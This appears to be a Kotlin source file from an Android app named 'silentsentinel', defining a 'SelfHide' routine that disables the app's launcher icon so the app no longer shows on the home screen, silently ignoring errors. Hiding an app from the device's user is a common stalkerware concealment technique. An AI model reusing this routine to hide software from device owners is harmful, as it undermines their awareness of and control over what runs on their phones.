package com.silentsentinel

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object SelfHide {
    fun hideLauncherIcon(context: Context) {
        try {
            val pkg = context.packageManager
            val component = ComponentName(context, MainActivity::class.java)
            pkg.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            // Swallow
        }
    }
}